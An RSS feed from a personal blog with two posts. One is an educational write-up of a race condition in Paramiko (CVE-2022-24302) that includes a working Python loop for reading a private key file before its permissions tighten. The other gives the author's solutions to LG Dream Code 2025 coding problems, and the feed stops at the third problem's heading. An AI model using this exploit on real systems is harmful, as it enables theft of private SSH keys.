<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Nam&#39;s Journal</title>
        <link>https://namberino.github.io/posts/</link>
        <description>Recent content in Posts on Nam&#39;s Journal</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 08 Jul 2025 21:35:37 +0700</lastBuildDate>
        <atom:link href="https://namberino.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Exploring Race Condition: Developing a Simple Exploit for CVE-2022-24302</title>
            <link>https://namberino.github.io/posts/2025/07/exploring-race-condition-developing-a-simple-exploit-for-cve-2022-24302/</link>
            <pubDate>Tue, 08 Jul 2025 21:35:37 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2025/07/exploring-race-condition-developing-a-simple-exploit-for-cve-2022-24302/</guid>
            <description>&lt;p&gt;Inter-Process Communication (IPC) is a family of mechanisms that allows processes to communicate with each other. These mechanisms are very important in modern software. However, if the developers misimplement these mechanisms, it could lead to race conditions and allows hackers to exploit it for malicious purposes. Today, we&amp;rsquo;ll develop an exploit for a file-based IPC vulnerability in the Paramiko library, which is an SSH implementation in Python, to learn more about race conditions.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Inter-Process Communication (IPC) is a family of mechanisms that allows processes to communicate with each other. These mechanisms are very important in modern software. However, if the developers misimplement these mechanisms, it could lead to race conditions and allows hackers to exploit it for malicious purposes. Today, we&rsquo;ll develop an exploit for a file-based IPC vulnerability in the Paramiko library, which is an SSH implementation in Python, to learn more about race conditions.</p>
<blockquote>
<p>Note: This is an exploit for CVE-2022-24302</p></blockquote>
<h2 id="the-vulnerability">The vulnerability</h2>
<p>Paramiko can be used to build SSH clients. In this library (Version 2.10.0), we can see there&rsquo;s a <code>_write_private_key_file</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_write_private_key_file</span>(self, filename, key, format, password<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>      os<span style="color:#f92672">.</span>chmod(filename, o600)
</span></span><span style="display:flex;"><span>      self<span style="color:#f92672">.</span>_write_private_key(f, key, format, password<span style="color:#f92672">=</span>password)
</span></span></code></pre></div><p>This function is used to write the private key to a file. The vulnerability lies in the first 2 lines of the function. It opens the file in write mode and change the permission of the file to a less privileged permission. The <code>open</code> function opens the file in a globally readable state, then the <code>os.chmod</code> changes it to a read-write permission to only the user associated with the process.</p>
<p>The vulnerability is between the <code>open</code> and the <code>chmod</code>, because the private key file is globally readable, a lower-privileged user can also open and read the file. Even though the private key write occurs after the <code>chmod</code>, we can still read it. This is due to file permissions being checked only when you open the file, once the file is opened, even if the permission is changed, it won&rsquo;t delete the opened file descriptor. The permission change only have an effect on new file descriptors.</p>
<p>So in order to exploit this vulnerability, we need to open the file after the private key file is opened and before the permission of the private key file is changed. Once we have opened the file, we can wait for the key write and then read the private key.</p>
<h2 id="the-exploit">The exploit</h2>
<p>I created this program that will generate a private key and write it to a file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> paramiko
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> paramiko<span style="color:#f92672">.</span>rsakey<span style="color:#f92672">.</span>RSAKey<span style="color:#f92672">.</span>generate(<span style="color:#ae81ff">2048</span>)
</span></span><span style="display:flex;"><span>key<span style="color:#f92672">.</span>write_private_key_file(<span style="color:#e6db74">&#34;./private.key&#34;</span>)
</span></span></code></pre></div><p>Now, we can create our exploit program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./private.key&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Private key file opened successfully.&#34;</span>)
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.01</span>)
</span></span><span style="display:flex;"><span>        print(f<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
</span></span></code></pre></div><p>This will continuously try to open the private key file. Once it has opened it, it will wait a little bit then read the file and print the private key.</p>
<p>Now for the actual exploit, we first run our exploit program as a lower-privileged user:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ whoami
</span></span><span style="display:flex;"><span>user
</span></span><span style="display:flex;"><span>$ python exploit.py
</span></span></code></pre></div><p>Next, we run the generate key program as a super user:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo python gen_key.py
</span></span></code></pre></div><p>If we check the exploit program again, we can see that it has successfully read the private key file even though it doesn&rsquo;t have the permission to read it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python exploit.py
</span></span><span style="display:flex;"><span>Private key file opened successfully.
</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ cat private.key
</span></span><span style="display:flex;"><span>cat: private.key: Permission denied
</span></span></code></pre></div><p>And voila, a race condition exploit on a real world vulnerability.</p>
<h2 id="conclusion">Conclusion</h2>
<p>IPC is used pretty much everywhere nowadays, making protection against IPC attacks vital. This file-based IPC exploit is a simple demonstration for how this kind of vulnerability can be exploited.</p>
<p>This was a rather short blog post. I&rsquo;m currently learning about vulnerability research and I found race condition vulnerabilities to be pretty interesting so I wanted to make this blog post. I hope you enjoyed this and learned something from it.</p>
]]></content>
        </item>
        
        <item>
            <title>My Solutions for LG Dream Code 2025</title>
            <link>https://namberino.github.io/posts/2025/06/my-solutions-for-lg-dream-code-2025/</link>
            <pubDate>Sun, 15 Jun 2025 21:12:49 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2025/06/my-solutions-for-lg-dream-code-2025/</guid>
            <description>&lt;p&gt;Recently, LG Electronics has recently been holding this Dream Code competition for graduating or recently graduated students in Vietnam. They just held one this year on June 14th and I got the chance of participating in it. Unfortunately, I didn&amp;rsquo;t make it to top 50 (probably because I was an hour late to the competition). I did manage to complete all the challenges, though my solutions aren&amp;rsquo;t the most efficient. Here are my solutions.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Recently, LG Electronics has recently been holding this Dream Code competition for graduating or recently graduated students in Vietnam. They just held one this year on June 14th and I got the chance of participating in it. Unfortunately, I didn&rsquo;t make it to top 50 (probably because I was an hour late to the competition). I did manage to complete all the challenges, though my solutions aren&rsquo;t the most efficient. Here are my solutions.</p>
<blockquote>
<p>I&rsquo;m going to paraphrase the problem to the essential parts because it&rsquo;s pretty long.</p></blockquote>
<h2 id="1st-problem-toy-race">1st problem: Toy Race</h2>
<p>This problem gives us 4 inputs: 3 ints (<code>N</code>, <code>X</code>, <code>Y</code>) and 1 int array (<code>V</code>). There&rsquo;s an additional variable in the problem called <code>Z</code> too.</p>
<ul>
<li><code>N</code> represents the label of our car.</li>
<li><code>X</code> represents the length of the race track.</li>
<li><code>Y</code> represents the maximum speed our car can handle.</li>
<li>Each variable in <code>V</code> represents the speed each car will move at. The index of the variable is the label of the car. So if my label <code>N = 3</code> then the 3rd variable in <code>V</code> is the speed of our car.</li>
<li><code>Z</code> represents the speed that our car will boost to for 1 second at the start of the race. So our car will travel at <code>Z</code> for 1 second at the beginning of the race then it will go at <code>V[N]</code> for the rest of the race.</li>
</ul>
<p>The goal here is to find the minimum <code>Z</code> value that would allow us to win the race and output that value to <code>stdout</code>. If we can win the race without using the booster, we output 0. If we can&rsquo;t win the race even if we use the booster at the maximum value <code>Y</code>, we output -1.</p>
<p>Below is a sample input for this problem:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>5
</span></span><span style="display:flex;"><span>3 12 11
</span></span><span style="display:flex;"><span>3 2 1
</span></span><span style="display:flex;"><span>3 12 9
</span></span><span style="display:flex;"><span>3 2 1
</span></span><span style="display:flex;"><span>3 12 10
</span></span><span style="display:flex;"><span>3 4 5
</span></span><span style="display:flex;"><span>3 80 80
</span></span><span style="display:flex;"><span>80 60 70
</span></span><span style="display:flex;"><span>3 80 80
</span></span><span style="display:flex;"><span>70 50 60
</span></span></code></pre></div><p>The first line is the number of test cases called <code>T</code>. Each cases contain 2 lines. The 1st line contains <code>N</code>, <code>X</code>, and <code>Y</code>. The 2nd line contains the values for <code>V</code>. All of these values are separated by a space.</p>
<p>Firstly, since this receives input via <code>stdin</code>, I builted this function for reading the data into variables using the <code>sys</code> library and <code>iter()</code> in our program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    it <span style="color:#f92672">=</span> iter(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    T <span style="color:#f92672">=</span> int(next(it))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(T):
</span></span><span style="display:flex;"><span>        N <span style="color:#f92672">=</span> int(next(it))
</span></span><span style="display:flex;"><span>        X <span style="color:#f92672">=</span> int(next(it))
</span></span><span style="display:flex;"><span>        Y <span style="color:#f92672">=</span> int(next(it))
</span></span><span style="display:flex;"><span>        V <span style="color:#f92672">=</span> [int(next(it)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(N)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(solve(N, X, Y, V))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Now we just need to implement the <code>solve()</code> function. I&rsquo;ll show the code first then I&rsquo;ll explain what it does.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>(label, track_len, max_boost, V):
</span></span><span style="display:flex;"><span>    speeds <span style="color:#f92672">=</span> V[:]
</span></span><span style="display:flex;"><span>    others_time <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    my_vel <span style="color:#f92672">=</span> speeds<span style="color:#f92672">.</span>pop(label <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    my_time <span style="color:#f92672">=</span> track_len <span style="color:#f92672">/</span> my_vel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># calc other&#39;s time</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> v <span style="color:#f92672">in</span> speeds:
</span></span><span style="display:flex;"><span>        others_time<span style="color:#f92672">.</span>append(track_len <span style="color:#f92672">/</span> v)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> my_time <span style="color:#f92672">&lt;</span> min(others_time):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># calc optimal Z</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> v <span style="color:#f92672">in</span> range(my_vel <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, max_boost <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>        boosted_dist <span style="color:#f92672">=</span> track_len <span style="color:#f92672">-</span> v
</span></span><span style="display:flex;"><span>        boosted_time <span style="color:#f92672">=</span> (boosted_dist <span style="color:#f92672">/</span> my_vel) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> boosted_time <span style="color:#f92672">&lt;</span> min(others_time):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> v
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>First, I copied the <code>V</code> array into <code>speeds</code> because I&rsquo;m going to perform some array manipulation. This doesn&rsquo;t really affect anything about this program because it&rsquo;s so short and specific, it&rsquo;s just standard practice. Next I grabbed our car&rsquo;s velocity value into <code>my_vel</code> and calculate the time it would take us to finish the race and store it into <code>my_time</code>.</p>
<p>Next, I calculated the values of the other cars&rsquo; race times and store it into <code>others_time</code>. If <code>my_time</code> is shorter than the minimum of <code>others_time</code>, we don&rsquo;t need to use the booster at all. Otherwise, we calculate the optimal <code>Z</code>.</p>
<p>For calculating the optimal <code>Z</code>, I iterate through each <code>Z</code> values from <code>my_vel + 1</code> to <code>Y</code>. Because the speed is measured in <code>m/s</code> and the track is in meters and the boost time is only 1 second, we can subtract the boost value from the length of the track to and add 1 second to our time, resulting in a new track length. On the new track length, we can calculate how much time it&rsquo;d take us to finish that track and add 1 second to that time, giving us the our boosted time.</p>
<p>Finally, we use the same compare logic as before. If it is the shortest time, we return the current <code>Z</code> value, else if no <code>Z</code> value is found, we return -1. This was a pretty simple problem.</p>
<h2 id="2nd-problem-string-reversal">2nd problem: String Reversal</h2>
<p>This problem gives us an array <code>S</code> with <code>N</code> number of strings. We are also given a function that reverse the string&rsquo;s character order. We need to find the &ldquo;<em>reversal string</em>&rdquo; that would make the array lexicographically sorted. The reversal string is a bitmask that specifies which string in the array to reverse.</p>
<p>For example: An array <code>S = [&quot;ABC&quot;, &quot;XC&quot;, &quot;DZ&quot;]</code>. There are multiple different reversal strings that would make <code>S</code> lexicographically sorted.</p>
<ul>
<li><code>001</code> would reverse &ldquo;DZ&rdquo; to &ldquo;ZD&rdquo;, which would make <code>S</code> lexicographically sorted.</li>
<li><code>010</code> would reverse &ldquo;XC&rdquo; to &ldquo;CX&rdquo;, which would also make <code>S</code> lexicographically sorted</li>
</ul>
<p>This is just 2 strings that would work, there are more that would also work for this particular <code>S</code>. The goal is to find a minimum reversal string that would make <code>S</code> lexicographically sorted. So as for the previous example, the output of <code>S = [&quot;ABC&quot;, &quot;XC&quot;, &quot;DZ&quot;]</code> would be <code>001</code> because it&rsquo;s the smallest binary that would sort <code>S</code>.</p>
<p>Below is a sample input for this problem:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>2
</span></span><span style="display:flex;"><span>3
</span></span><span style="display:flex;"><span>ABC
</span></span><span style="display:flex;"><span>ABD
</span></span><span style="display:flex;"><span>XY
</span></span><span style="display:flex;"><span>3
</span></span><span style="display:flex;"><span>ABC
</span></span><span style="display:flex;"><span>XC
</span></span><span style="display:flex;"><span>DZ
</span></span></code></pre></div><p>The first number is the number of test cases <code>T</code>. Each test cases will start with a number <code>N</code>. <code>N</code> is the length of the array <code>S</code>. Following that number are the strings inside the array <code>S</code>. The strings are only uppercase English letter.</p>
<p>Firstly, we need to read the data into our program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    it <span style="color:#f92672">=</span> iter(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    T <span style="color:#f92672">=</span> int(next(it))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(T):
</span></span><span style="display:flex;"><span>        N <span style="color:#f92672">=</span> int(next(it))
</span></span><span style="display:flex;"><span>        S <span style="color:#f92672">=</span> [next(it) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(N)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(solve(N, S))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>We&rsquo;ll brute-force this problem first, then optimize this program later. Firstly, we need to implement a function that reverses string as it&rsquo;s an integral part of the problem. This is pretty simple to do in Python, it&rsquo;s just 1 line:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rev_str</span>(string):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> string[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span></code></pre></div><p>We&rsquo;ll need some more helper functions. We need a function that checks whether <code>S</code> is lexicographically sorted or not and a function that translate the reversal string into indices in <code>S</code> that needs to be reversed. The 1st one is pretty simple to implement in Python, we just use <code>sorted()</code>. The 2nd one is also pretty simple, just check for the character &lsquo;1&rsquo; and return the indices in an array.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_lex_order</span>(str_arr):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> str_arr <span style="color:#f92672">==</span> sorted(str_arr)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_rev_indices</span>(string):
</span></span><span style="display:flex;"><span>    indices <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, c <span style="color:#f92672">in</span> enumerate(string):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
</span></span><span style="display:flex;"><span>            indices<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> indices
</span></span></code></pre></div><p>There&rsquo;s also another helper function that I made called <code>bump()</code>. This just increases the reverse string like a binary number.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bump</span>(bin_str):
</span></span><span style="display:flex;"><span>    length <span style="color:#f92672">=</span> len(bin_str)
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> int(bin_str, <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">%=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> length)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> format(n, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;0</span><span style="color:#e6db74">{</span>length<span style="color:#e6db74">}</span><span style="color:#e6db74">b&#39;</span>)
</span></span></code></pre></div><p>Now we can put this together and create a <code>solve()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>(arr_len, str_arr):
</span></span><span style="display:flex;"><span>    reversal_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#f92672">*</span> arr_len
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> check_lex_order(str_arr):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        reversal_str <span style="color:#f92672">=</span> bump(reversal_str)
</span></span><span style="display:flex;"><span>        indices <span style="color:#f92672">=</span> get_rev_indices(reversal_str)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> idx <span style="color:#f92672">in</span> indices:
</span></span><span style="display:flex;"><span>            str_arr[idx] <span style="color:#f92672">=</span> rev_str(str_arr[idx])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> reversal_str
</span></span></code></pre></div><p>For this function, we first initialize the reversal string with zeroes. Next, we enter a loop that will keep looking for the correct reversal string. We check if <code>S</code> is in order, if yes then we break out of the loop. Next, we bump the reversal string to the next one, get the strings indices then reverse the strings in <code>S</code> at those indices.</p>
<p>This is a super simple brute-force approach. However, this did not meet the time limit as it was too slow. So I had to go back to the drawing board and come up with a better solution.</p>
<p>I landed on this 2-state dynamic programming approach:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>(arr_len, str_arr):
</span></span><span style="display:flex;"><span>    A <span style="color:#f92672">=</span> [[s, rev_str(s)] <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> str_arr]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dp <span style="color:#f92672">=</span> [[<span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(arr_len)]
</span></span><span style="display:flex;"><span>    dp[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>    dp[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, arr_len):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>            best <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> prev <span style="color:#f92672">in</span> (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>                prev_bits <span style="color:#f92672">=</span> dp[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>][prev]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> prev_bits <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> A[i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>][prev] <span style="color:#f92672">&lt;=</span> A[i][r]:
</span></span><span style="display:flex;"><span>                    cand <span style="color:#f92672">=</span> prev_bits <span style="color:#f92672">+</span> str(r)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> best <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> cand <span style="color:#f92672">&lt;</span> best:
</span></span><span style="display:flex;"><span>                        best <span style="color:#f92672">=</span> cand
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            dp[i][r] <span style="color:#f92672">=</span> best
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    final0, final1 <span style="color:#f92672">=</span> dp[arr_len <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> final0 <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> final1
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> final1 <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> final0
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> min(final0, final1)
</span></span></code></pre></div><p><code>A</code> is a 2D array that holds the precomputed reversed string for each string in <code>S</code>. <code>dp</code> is the DP table for holding the smallest reversal string that sorts <code>S</code> lexicographically. We also initialize the <code>dp</code> table with 2 possible direction: reversing the first string or not reversing the first string. Each subsequent element of the <code>dp</code> table will be built on top of this initialization. The idea is the algorithm will search for the first reversal string with &ldquo;0&rdquo; that keeps the current string and the previous string in lexical order. If it can&rsquo;t do that, it will move to using the reversed version of that string.</p>
<p>The outermost loop is the main gear of this function. We loop over each string pairs. The 1st inner loop loops over each of the bit choices for the current string. The 2nd inner loop loops over each bit choices for the previous string.</p>
<p>We check if the previous bit is none or not, if yes then it&rsquo;s not a valid bit and we skip it. Else, we first check if the previous string is in lexical order with the current string. If this condition is satisfied, we form a new candidate for the reversal string. We store the candidate in the <code>dp</code> table.</p>
<p>The last element of the <code>dp</code> table contains the final reversal string. We just grab which ever one that isn&rsquo;t none and return it. If both are not none then we just return which ever string is smaller.</p>
<p>This is much faster than the brute-force approach. In the brute-force approach, worst case scenario, we loop through all of the reversal string, and perform reversal on all of them to check. I calculated <code>check_lex_order()</code> to be <code>O(NS log N)</code> with <code>S</code> being the length of the string, <code>get_rev_indices()</code> to be <code>O(N)</code>, and the inner loop in <code>solve()</code> to be <code>O(N)</code>, meaning we reverse all the strings in the array. This gives us a time complexity of <code>O(NS log N + 2N)</code>.</p>
<p>The 2-state DP approach is <code>O(N * 4)</code> because we only do <code>N</code> iteration in the outermost loop with the 2 inner loops doing at most 2 iteration each. Probably not the most efficient solution to this problem but it&rsquo;s good enough for me.</p>
<h2 id="3rd-problem-good-node-subsets">3rd problem: Good Node-subsets</h2>
